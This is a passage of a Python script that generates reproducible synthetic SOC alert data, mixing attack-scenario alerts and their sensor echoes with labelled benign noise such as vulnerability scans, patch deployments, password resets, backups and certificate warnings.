            "scenario_id": f"SCN-{extra_i + 1:03d}",
            "ground_truth_incident_id": f"GT-INC-{extra_i + 1:03d}",
            "title": f"{tmpl['title']} (Campaign #{campaign_num})",
            "start_offset_min": start_offset,
            "stages": new_stages
        })

    return scenarios


def generate_alerts(count: int = 3000, seed: int = 42) -> List[RawAlert]:
    """
    Generates a reproducible dataset of realistic SOC security alerts.
    
    Parameters:
    - count (int): Total number of alerts to generate (default 3,000).
    - seed (int): Random seed ensuring strict reproducibility (default 42).
    
    Returns:
    - List[RawAlert]: Chronologically sorted list of 19-field RawAlert objects.
    """
    rng = random.Random(seed)
    base_time = datetime(2026, 9, 18, 6, 0, 0, tzinfo=timezone.utc)
    alert_counter = 10001
    alerts: List[RawAlert] = []

    # 1. Generate Multi-Stage Realistic Attack Scenarios (10 for 3k demo, proportionally scaled for stress tests)
    target_scenarios = 10 if count <= 3000 else max(10, round(count * (10 / 3000)))
    scenarios = _build_scaled_attack_scenarios(base_time, rng, target_scenarios)

    for scn in scenarios:
        scn_base_time = base_time + timedelta(minutes=scn["start_offset_min"])
        
        for stage_idx, stage in enumerate(scn["stages"]):
            # Chronological progression: 15 to 35 minutes per stage
            stage_time = scn_base_time + timedelta(minutes=stage_idx * 22 + rng.randint(0, 8), seconds=rng.randint(0, 59))
            
            # Primary stage alert
            alerts.append(RawAlert(
                alert_id=f"ALT-{alert_counter}",
                timestamp=stage_time.isoformat(),
                source=stage["source"],
                alert_type=stage["alert_type"],
                severity=stage["severity"],
                asset_id=stage["asset_id"],
                asset_name=stage["asset_name"],
                hostname=stage["asset_name"],
                asset_criticality=stage["asset_criticality"],
                user=stage["user"],
                source_ip=stage["source_ip"],
                destination_ip=stage["destination_ip"],
                protocol=stage.get("protocol", "TCP"),
                indicator=stage.get("indicator", ""),
                description=stage["description"],
                mitre_tactic=stage.get("mitre_tactic"),
                mitre_technique=stage.get("mitre_technique"),
                scenario_id=scn["scenario_id"],
                ground_truth_incident_id=scn["ground_truth_incident_id"],
                is_false_positive=False,
                evidence=stage["evidence"]
            ))
            alert_counter += 1

            # Realistic Sensor Retrigger / Corroborating Echoes (e.g. secondary firewall flow, EDR hook)
            retrigger_count = rng.randint(1, 3)
            for echo_i in range(retrigger_count):
                echo_time = stage_time + timedelta(seconds=(echo_i + 1) * rng.randint(15, 45))
                alerts.append(RawAlert(
                    alert_id=f"ALT-{alert_counter}",
                    timestamp=echo_time.isoformat(),
                    source=stage["source"],
                    alert_type=f"{stage['alert_type']} (Sensor Retrigger)",
                    severity=stage["severity"],
                    asset_id=stage["asset_id"],
                    asset_name=stage["asset_name"],
                    hostname=stage["asset_name"],
                    asset_criticality=stage["asset_criticality"],
                    user=stage["user"],
                    source_ip=stage["source_ip"],
                    destination_ip=stage["destination_ip"],
                    protocol=stage.get("protocol", "TCP"),
                    indicator=stage.get("indicator", ""),
                    description=f"Corroborating sensor telemetry: {stage['description']}",
                    mitre_tactic=stage.get("mitre_tactic"),
                    mitre_technique=stage.get("mitre_technique"),
                    scenario_id=scn["scenario_id"],
                    ground_truth_incident_id=scn["ground_truth_incident_id"],
                    is_false_positive=False,
                    evidence=stage["evidence"]
                ))
                alert_counter += 1

    # 2. Realistic Benign Background Noise Generators (Authentic False Positives with Real-World Diversity)
    # Realistic enterprise assets for maintenance: Critical, High, Medium, and Low
    crit_assets = [a for a in ENTERPRISE_ASSETS if a["criticality"] == "Critical"]
    high_assets = [a for a in ENTERPRISE_ASSETS if a["criticality"] == "High"]
    med_assets = [a for a in ENTERPRISE_ASSETS if a["criticality"] == "Medium"]
    low_assets = [a for a in ENTERPRISE_ASSETS if a["criticality"] == "Low"]

    scanners = ["Qualys", "Tenable Nessus", "Rapid7 InsightVM"]
    scan_policies = [
        "Quarterly PCI-DSS Audit", "Weekly Infrastructure Vulnerability Assessment",
        "Monthly CIS Benchmark Compliance Scan", "Internal DMZ Hygiene Audit"
    ]
    deploy_kbs = ["KB5028166", "KB5031356", "KB5032189", "KB5034129", "KB5035853"]
    deploy_procs = ["CcmExec.exe", "msiexec.exe", "dism.exe"]
    sspr_methods = ["Microsoft Authenticator App", "FIDO2 Hardware Key", "Windows Hello for Business"]
    av_sigs = ["v1.402.19.0", "v1.403.42.0", "v1.404.110.0", "v1.405.88.0"]
    av_engines = ["1.397.102.0", "1.398.204.0", "1.399.50.0"]
    cdn_domains = [
        "windowsupdate.microsoft.com", "login.microsoftonline.com", "portal.azure.com",
        "kms.core.windows.net", "delivery.mp.microsoft.com"
    ]
    backup_jobs = ["Daily_Incremental_0300", "Hourly_Log_Ship_Sync", "Nightly_Full_DB_Snapshot", "Secondary_Replica_Verification"]
    ssl_domains = [
        ("*.staging.contoso.internal", "DEV-STAGING-04", "AST-DEV-STAGING-04", "Low"),
        ("vpn.gateway.contoso.com", "GATEWAY-PERIMETER", "AST-GATEWAY-PERIMETER", "High"),
        ("api.internal.contoso.com", "DMZ-WEB-SRV-02", "AST-DMZ-WEB-02", "High"),
        ("vault.sharepoint.contoso.com", "CORP-SHAREPOINT", "AST-CORP-SP-01", "Critical")
    ]
    diag_sessions = ["DiagTrack_Performance_Daily", "System_Health_Collector", "Disk_IOPS_Telemetry", "Memory_Footprint_Audit"]

    # 3. Interleave Benign Noise to Reach Exactly 'count' Total Alerts
    current_attack_count = len(alerts)
    needed_noise = max(0, count - current_attack_count)

    # 24-hour distribution window (86,400 seconds)
    total_seconds = 86400

    for i in range(needed_noise):
        category_idx = i % 8
        host_num = (i % 350) + 1
        campaign_num = (i % 25) + 1
        campaign_id = f"MAINT-GRP-{campaign_num:03d}"

        # Distribute evenly across 24 hours with slight realistic jitter
        sec_offset = int((i / max(needed_noise, 1)) * total_seconds) + rng.randint(0, 15)
        t = base_time + timedelta(seconds=sec_offset)

        if category_idx == 0:
            # Vulnerability Scanning (Critical, High, and Low assets probed)
            target_asset = (crit_assets + high_assets + low_assets)[i % (len(crit_assets) + len(high_assets) + len(low_assets))]
            sev = "Informational" if i % 3 == 0 else ("Low" if i % 3 == 1 else "Medium")
            scanner = scanners[i % len(scanners)]
            policy = scan_policies[i % len(scan_policies)]
            alert_type = "Scheduled Vulnerability Scan Activity" if i % 2 == 0 else "Internal Vulnerability Scan Assessment"
            desc = f"{scanner} vulnerability scanner probed {target_asset['name']} during {policy}"
            ev = {"scanner": scanner, "policy": policy, "target_ip": target_asset["ip"], "ports_scanned": [80, 443, 8080, 3389][: (i % 3 + 2)]}
            alerts.append(RawAlert(
                alert_id=f"ALT-{alert_counter}",
                timestamp=t.isoformat(),
                source="Network Firewall",
                alert_type=alert_type,
                severity=sev,
                asset_id=target_asset["id"],
                asset_name=target_asset["name"],
                hostname=target_asset["name"],
                asset_criticality=target_asset["criticality"],
                user="svc-qualys",
                source_ip="10.0.100.2",
                destination_ip=target_asset["ip"],
                protocol="TCP",
                indicator="10.0.100.2",
                description=desc,
                mitre_tactic=None,
                mitre_technique=None,
                scenario_id=None,
                ground_truth_incident_id=None,
                is_false_positive=True,
                evidence=ev
            ))

        elif category_idx == 1:
            # Software Deployment (Endpoints and Critical/High servers)
            if i % 4 == 0:
                srv = (crit_assets + high_assets)[i % (len(crit_assets) + len(high_assets))]
                host_str = srv["name"]
                asset_id = srv["id"]
                crit = srv["criticality"]
                user_str = "SYSTEM"
                src_ip = srv["ip"]
                sev = "Low" if i % 2 == 0 else "Medium"
            else:
                host_str = f"CORP-CLIENT-{host_num:03d}"
                asset_id = f"AST-CLIENT-{host_num:03d}"
                crit = "Low"
                user_str = "SYSTEM"
                src_ip = f"10.0.{host_num // 250 + 5}.{host_num % 250 + 1}"
                sev = "Informational" if i % 2 == 0 else "Low"

            kb = deploy_kbs[i % len(deploy_kbs)]
            proc = deploy_procs[i % len(deploy_procs)]
            alert_type = "Automated Software Deployment Completed" if i % 2 == 0 else "Endpoint Software Deployment Activity"
            desc = f"System Center Configuration Manager deployed approved {kb} via {proc} on {host_str}"
            ev = {"kb_number": kb, "installer": proc, "exit_code": 0, "restart_required": (i % 2 == 1)}
            alerts.append(RawAlert(
                alert_id=f"ALT-{alert_counter}",
                timestamp=t.isoformat(),
                source="Endpoint EDR",
                alert_type=alert_type,
                severity=sev,
                asset_id=asset_id,
                asset_name=host_str,
                hostname=host_str,
                asset_criticality=crit,
                user=user_str,
                source_ip=src_ip,
                destination_ip="10.0.1.1",
                protocol="LOCAL",
                indicator=proc,
                description=desc,
                mitre_tactic=None,
                mitre_technique=None,
                scenario_id=None,
                ground_truth_incident_id=None,
                is_false_positive=True,
                evidence=ev
            ))

        elif category_idx == 2:
            # User Password Reset (SSPR Portal and IDP)
            sev = "Low" if i % 3 != 0 else "Medium"
            method = sspr_methods[i % len(sspr_methods)]
            emp_num = (i * 7) % 500 + 1
            user_str = f"employee.{emp_num:03d}@contoso.com"
            crit = "Critical" if i % 5 == 0 else "Low"
            host_str = "IDP-OKTA-GATEWAY" if crit == "Critical" else "SSPR-PORTAL"
            asset_id = "AST-IDP-OKTA-01" if crit == "Critical" else "AST-SSPR-PORTAL"
            alert_type = "User Self-Service Password Reset" if i % 2 == 0 else "Self-Service Password Reset Completed"
            desc = f"{user_str} completed step-up challenge using {method} on {host_str}"
            ev = {"method": method, "status": "Success", "auth_factor": "FIDO2/MFA", "client_ip": f"10.0.100.{emp_num % 50 + 1}"}
            alerts.append(RawAlert(
                alert_id=f"ALT-{alert_counter}",
                timestamp=t.isoformat(),
                source="Identity Provider",
                alert_type=alert_type,
                severity=sev,
                asset_id=asset_id,
                asset_name=host_str,
                hostname=host_str,
                asset_criticality=crit,
                user=user_str,
                source_ip=f"10.0.100.{emp_num % 50 + 1}",
                destination_ip="10.0.100.8",
                protocol="HTTPS",
                indicator="10.0.100.8",
                description=desc,
                mitre_tactic=None,
                mitre_technique=None,
                scenario_id=None,
                ground_truth_incident_id=None,
                is_false_positive=True,
                evidence=ev
            ))

        elif category_idx == 3:
            # Antivirus Signature Updates (Clients and Domain Controllers / Database)
            if i % 3 == 0:
                srv = crit_assets[i % len(crit_assets)]
                host_str = srv["name"]
                asset_id = srv["id"]
                crit = srv["criticality"]
                src_ip = srv["ip"]
            else:
                host_str = f"CORP-CLIENT-{host_num:03d}"
                asset_id = f"AST-CLIENT-{host_num:03d}"
                crit = "Low"
                src_ip = f"10.0.{host_num // 250 + 5}.{host_num % 250 + 1}"

            sig_ver = av_sigs[i % len(av_sigs)]
            eng_ver = av_engines[i % len(av_engines)]
            alert_type = "Antivirus Signature Database Updated"
            desc = f"Defender definition signatures updated to {sig_ver} (Engine: {eng_ver}) on {host_str}"
            ev = {"engine_version": eng_ver, "proc": "MsMpEng.exe", "signatures": sig_ver}
            alerts.append(RawAlert(
                alert_id=f"ALT-{alert_counter}",
                timestamp=t.isoformat(),
                source="Endpoint EDR",
                alert_type=alert_type,
                severity="Informational" if i % 2 == 0 else "Low",
                asset_id=asset_id,
                asset_name=host_str,
                hostname=host_str,
                asset_criticality=crit,
                user="SYSTEM",
                source_ip=src_ip,
                destination_ip="10.0.1.1",
                protocol="LOCAL",
                indicator="MsMpEng.exe",
                description=desc,
                mitre_tactic=None,
                mitre_technique=None,
                scenario_id=None,
                ground_truth_incident_id=None,
                is_false_positive=True,
                evidence=ev
            ))

        elif category_idx == 4:
            # DNS Lookups (Microsoft CDN & Cloud Services)
            cdn_host = cdn_domains[i % len(cdn_domains)]
            host_str = f"CORP-CLIENT-{host_num:03d}"
            asset_id = f"AST-CLIENT-{host_num:03d}"
            src_ip = f"10.0.{host_num // 250 + 5}.{host_num % 250 + 1}"
            alert_type = "DNS Lookup to Microsoft CDN" if i % 2 == 0 else "DNS Lookup to Azure Cloud Services"
            desc = f"DNS resolution query for official {cdn_host} on {host_str}"
            ev = {"query": cdn_host, "resolved_ip": f"20.189.{(i * 17) % 200 + 10}.1", "ttl": 300}
            alerts.append(RawAlert(
                alert_id=f"ALT-{alert_counter}",
                timestamp=t.isoformat(),
                source="Network Firewall",
                alert_type=alert_type,
                severity="Informational" if i % 2 == 0 else "Low",
                asset_id=asset_id,
                asset_name=host_str,
                hostname=host_str,
                asset_criticality="Low",
                user="SYSTEM",
                source_ip=src_ip,
                destination_ip="10.0.1.1",
                protocol="DNS",
                indicator=cdn_host,
                description=desc,
                mitre_tactic=None,
                mitre_technique=None,
                scenario_id=None,
                ground_truth_incident_id=None,
                is_false_positive=True,
                evidence=ev
            ))

        elif category_idx == 5:
            # Automated Database Backup (Primary SQL and Backup Vaults)
            is_sql = (i % 2 == 0)
            target = crit_assets[3] if is_sql else med_assets[1]  # PROD-DB-SQL-01 (Critical) or BACKUP-STORAGE-VAULT (Medium)
            sev = "Low" if i % 3 == 0 else ("Medium" if i % 3 == 1 else "High")
            job = backup_jobs[i % len(backup_jobs)]
            size_gb = round(25.0 + (i * 3.7) % 180.0, 1)
            alert_type = "Nightly Automated Database Backup" if i % 2 == 0 else "Automated Database Backup Completed"
            desc = f"Veeam backup agent created consistent snapshot volume for {job} ({size_gb} GB) on {target['name']}"
            ev = {"backup_job": job, "size_gb": size_gb, "status": "Completed", "target_vault": "10.0.8.22"}
            alerts.append(RawAlert(
                alert_id=f"ALT-{alert_counter}",
                timestamp=t.isoformat(),
                source="Cloud Audit",
                alert_type=alert_type,
                severity=sev,
                asset_id=target["id"],
                asset_name=target["name"],
                hostname=target["name"],
                asset_criticality=target["criticality"],
                user="svc-veeam",
                source_ip="10.0.8.22",
                destination_ip="10.0.2.15",
                protocol="HTTPS",
                indicator="10.0.8.22",
                description=desc,
                mitre_tactic=None,
                mitre_technique=None,
                scenario_id=None,
                ground_truth_incident_id=None,
                is_false_positive=True,
                evidence=ev
            ))

        elif category_idx == 6:
            # SSL Certificate Expiration (Staging, DMZ, Gateway, and SharePoint)
            domain_info = ssl_domains[i % len(ssl_domains)]
            days_left = [3, 7, 14, 21][i % 4]
            sev = "High" if days_left <= 3 else ("Medium" if days_left <= 7 else "Low")
            alert_type = "SSL Certificate Expiration Warning" if i % 2 == 0 else "SSL Certificate Expiration Notice"
            desc = f"TLS server certificate for {domain_info[0]} expires within {days_left} days on {domain_info[1]}"
            ev = {"cn": domain_info[0], "days_remaining": days_left, "issuer": "Contoso Internal CA"}
            alerts.append(RawAlert(
                alert_id=f"ALT-{alert_counter}",
                timestamp=t.isoformat(),
                source="Network Firewall",
                alert_type=alert_type,
                severity=sev,
                asset_id=domain_info[2],
                asset_name=domain_info[1],
                hostname=domain_info[1],
                asset_criticality=domain_info[3],
                user="SYSTEM",
                source_ip="10.0.1.1",
                destination_ip="10.0.1.1",
                protocol="TLS",
                indicator=domain_info[0],
                description=desc,
                mitre_tactic=None,
                mitre_technique=None,
                scenario_id=None,
                ground_truth_incident_id=None,
                is_false_positive=True,
                evidence=ev
            ))

        else:
            # Routine IT Diagnostic (Workstations, Domain Controllers, and Servers)
            if i % 3 == 0:
                srv = (crit_assets + med_assets)[i % (len(crit_assets) + len(med_assets))]
                host_str = srv["name"]
                asset_id = srv["id"]
                crit = srv["criticality"]
                src_ip = srv["ip"]
            else:
                host_str = f"CORP-CLIENT-{host_num:03d}"
                asset_id = f"AST-CLIENT-{host_num:03d}"
                crit = "Low"
                src_ip = f"10.0.{host_num // 250 + 5}.{host_num % 250 + 1}"

            session = diag_sessions[i % len(diag_sessions)]
            alert_type = "Routine IT Diagnostic Log Collection"
            desc = f"Scheduled enterprise telemetry collector gathered {session} on {host_str}"
            ev = {"diagnostic_session": session, "caller": "svchost.exe"}
            alerts.append(RawAlert(
                alert_id=f"ALT-{alert_counter}",
                timestamp=t.isoformat(),
                source="Endpoint EDR",
                alert_type=alert_type,
                severity="Informational" if i % 2 == 0 else "Low",
                asset_id=asset_id,
                asset_name=host_str,
                hostname=host_str,
                asset_criticality=crit,
                user="SYSTEM",
                source_ip=src_ip,
                destination_ip="10.0.1.1",
                protocol="LOCAL",
                indicator="msdt.exe",
                description=desc,
                mitre_tactic=None,
                mitre_technique=None,
                scenario_id=None,
                ground_truth_incident_id=None,
                is_false_positive=True,
                evidence=ev
            ))

        alert_counter += 1

    # 4. Chronologically sort alerts so attack and noise are intermixed realistically
    alerts.sort(key=lambda a: a.timestamp)

    # In case count requested was less than current total, slice precisely to count
    return alerts[:count]


def generate_3000_alerts() -> List[RawAlert]:
    """Default demonstration entry point producing exactly 3,000 synthetic alerts with seed 42."""
    return generate_alerts(count=3000, seed=42)


if __name__ == "__main__":
    import argparse
    import json
    import os

    parser = argparse.ArgumentParser(description="Synthetic Security Alert Generator for Problem Statement #25")
    parser.add_argument("--num-alerts", "--count", type=int, default=3000, help="Total alerts to generate (default: 3000)")
    parser.add_argument("--seed", type=int, default=42, help="Random seed (default: 42)")
    parser.add_argument("--output", type=str, default=None, help="Optional output JSON file path")
    args = parser.parse_args()

    print(f"[Ingestion] Generating {args.num_alerts} alerts (seed={args.seed})...")
    t0 = datetime.now()
    alerts_data = generate_alerts(count=args.num_alerts, seed=args.seed)
    elapsed = (datetime.now() - t0).total_seconds()
    print(f"[Ingestion] Successfully generated {len(alerts_data)} alerts in {elapsed:.3f}s.")

    if args.output:
        os.makedirs(os.path.dirname(os.path.abspath(args.output)), exist_ok=True)
        with open(args.output, "w", encoding="utf-8") as f:
            json.dump([a.model_dump() for a in alerts_data], f, indent=2)
        print(f"[Ingestion] Saved dataset to {args.output}")
